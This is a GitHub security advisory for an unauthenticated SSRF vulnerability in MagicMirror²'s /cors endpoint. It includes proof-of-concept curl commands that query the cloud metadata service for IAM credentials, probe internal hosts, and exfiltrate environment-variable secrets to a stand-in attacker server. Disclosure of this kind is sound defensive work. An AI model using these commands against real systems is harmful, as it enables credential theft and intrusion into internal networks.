# [C] MagicMirror vulnerable to unauthenticated SSRF via /cors endpoint

## Summary
Severity: Critical
Advisory: GHSA-ph6f-2cvq-79hq
CVE: CVE-2026-42281
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-ph6f-2cvq-79hq
Type: github-advisory

## Affected
- npm: `magicmirror` — affected >=0 <2.36.0

## Details
### Summary

An unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the `/cors` endpoint allows any remote attacker to force the MagicMirror² server to perform arbitrary HTTP requests to internal networks, cloud metadata services, and localhost services. The endpoint also expands environment variable placeholders (`**VAR_NAME**`), enabling exfiltration of server-side secrets.

### Details

The `/cors` endpoint in `js/server_functions.js` (function `cors()`, lines 37-78) acts as an open HTTP proxy with no authentication and no URL validation. Any user-supplied URL is fetched server-side via `fetch()` and the full response is returned to the caller.

Additionally, the `replaceSecretPlaceholder()` function (lines 21-25) expands any `**VARIABLE_NAME**` pattern in the URL with the corresponding `process.env` value before the request is made, allowing an attacker to exfiltrate environment variables (e.g. API keys, tokens, database credentials).

**Vulnerable code path:**

```
GET /cors?url=<attacker-controlled-url>
  → replaceSecretPlaceholder(url)     // expands **ENV_VAR** → process.env.ENV_VAR
  → fetch(url)                        // no validation, no blocklist
  → response returned to attacker     // full body, status, headers
```

**Key issues:**
- No authentication required
- No URL validation or blocklist for private/reserved IP ranges
- No restriction on URL scheme or destination
- Environment variable expansion in URL before fetch

### PoC

**Prerequisites:** a running MagicMirror² instance accessible on the network (default: `http://<host>:8080`).

**1. Basic SSRF — access cloud metadata (AWS IMDSv1):**

```
curl "http://<target>:8080/cors?url=http://169.254.169.254/latest/meta-data/"
```

If the server runs on AWS EC2 without IMDSv2 enforcement, this returns instance metadata including IAM role credentials.

**2. Internal network scanning:**

```
curl "http://<target>:8080/cors?url=http://192.168.1.1/"
curl "http://<target>:8080/cors?url=http://127.0.0.1:3000/"
```

The attacker can probe internal services by observing response status codes and timing.

**3. Environment variable exfiltration:**

```
curl "http://<target>:8080/cors?url=http://<attacker-server>/?leak=**SECRET_API_KEY**"
```

The server expands `**SECRET_API_KEY**` to the value of `process.env.SECRET_API_KEY` before making the request, sending the secret to the attacker-controlled server as a query parameter.

### Impact

- **Cloud deployments (AWS/GCP/Azure):** full compromise of cloud instance credentials via metadata service (169.254.169.254), potentially leading to lateral movement within the cloud account
- **Internal network access:** the server becomes a proxy to scan and interact with services on internal networks that are not directly reachable by the attacker
- **Secret exfiltration:** environment variables containing API keys, database credentials, or other sensitive configuration are directly readable
- **Affected users:** anyone running MagicMirror² exposed to an untrusted network (including LAN). The `/cors` endpoint requires no authentication, so any host that can reach the MagicMirror HTTP port can exploit this vulnerability

## References
- https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-ph6f-2cvq-79hq
- https://nvd.nist.gov/vuln/detail/CVE-2026-42281
- https://github.com/MagicMirrorOrg/MagicMirror
- https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.36.0
